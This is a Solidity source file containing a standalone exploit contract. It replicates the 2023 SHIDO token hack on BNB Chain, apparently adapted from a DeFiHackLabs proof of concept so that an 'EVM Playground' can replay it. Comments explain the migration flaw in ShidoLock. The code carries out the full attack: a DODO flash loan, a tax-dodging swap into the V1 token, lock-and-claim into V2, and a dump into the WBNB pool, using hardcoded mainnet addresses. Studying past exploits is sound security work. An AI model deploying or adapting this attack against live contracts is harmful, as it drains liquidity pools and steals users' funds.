// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-SHIDO).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so there
// is no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit -> DPPFlashLoanCall -> WBNBToSHIDOINU ->
// LockAndClaimToken -> SHIDOToWBNB) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/SHIDO_exp.sol.
//
// Root cause: ShidoLock.lockTokens() credits userShidoV1[msg.sender] with the
// caller's SPOT balance of the freely-tradable V1 token (SHIDOINU, 9 decimals),
// with no snapshot/whitelist/cap. claimTokens() then pays out that credit * 1e9
// in V2 (SHIDO, 18 decimals) pulled from a reward wallet that pre-approved the
// lock contract for type(uint256).max. Buying cheap V1 on the open market and
// migrating it 1:1 lets the attacker drain the deep SHIDO-V2/WBNB pool.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWBNB {
    function withdraw(uint256) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IFeeFreeRouter {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address payable to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IShidoLock {
    function lockTokens() external;
    function claimTokens() external;
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract SHIDODrain {
    IERC20 constant SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IERC20 constant SHIDOINU = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IFeeFreeRouter constant FeeFreeRouter = IFeeFreeRouter(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock constant ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
    address constant dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    // step 0: flash-borrow 40 WBNB from DODO; the callback below does the drain.
    function run() external {
        IDVM(dodo).flashLoan(40 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        WBNBToSHIDOINU();
        LockAndClaimToken();
        SHIDOToWBNB();

        WBNB.transfer(dodo, baseAmount);
    }

    function WBNBToSHIDOINU() internal {
        WBNB.approve(address(Router), 100_000 * 1e18);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SHIDOINU);
        // Route the bulk swap output to FeeFreeRouter (not this contract) so the
        // subsequent addLiquidityETH round-trip returns it fee-free (dodges
        // SHIDOINU's transfer tax that a direct swap-to-self would incur).
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            39 * 1e18, 0, path, address(FeeFreeRouter), block.timestamp
        );
        IWBNB(address(WBNB)).withdraw(10 * 1e15);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(10 * 1e15, 0, path, address(this), block.timestamp);
        SHIDOINU.approve(address(FeeFreeRouter), 1e27);
        FeeFreeRouter.addLiquidityETH{value: 0.01 ether}(
            address(SHIDOINU), 1e9, 1, 1, payable(address(this)), block.timestamp
        );
    }

    function LockAndClaimToken() internal {
        SHIDOINU.approve(address(ShidoLock), type(uint256).max);
        ShidoLock.lockTokens();
        ShidoLock.claimTokens();
    }

    function SHIDOToWBNB() internal {
        SHIDO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(SHIDO);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHIDO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
